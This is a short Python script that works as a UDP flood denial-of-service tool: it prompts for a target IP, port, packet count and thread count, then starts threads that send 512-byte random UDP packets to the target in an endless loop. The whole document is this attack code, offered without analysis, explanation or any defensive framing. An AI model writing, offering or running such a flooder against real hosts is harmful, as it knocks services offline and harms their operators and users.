import random
import socket
import threading
import keyboard
import time

ip = str(input(" IP: "))
port = int(input(" PORT: "))
times = int(input(" PACKETS PER THREAD: "))
threads = int(input(" THREADS: "))
def main():
	print("STARTING " + str(threads) + "threads" + "... " + "\n")
	for y in range(threads):
		th = threading.Thread(target=go)
		th.start()
def go():
	print("THREAD RUNNING ")
	data = random._urandom(512)
	while 1:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		addr = (str(ip),int(port))
		for x in range(times):
			s.sendto(data,addr)
main()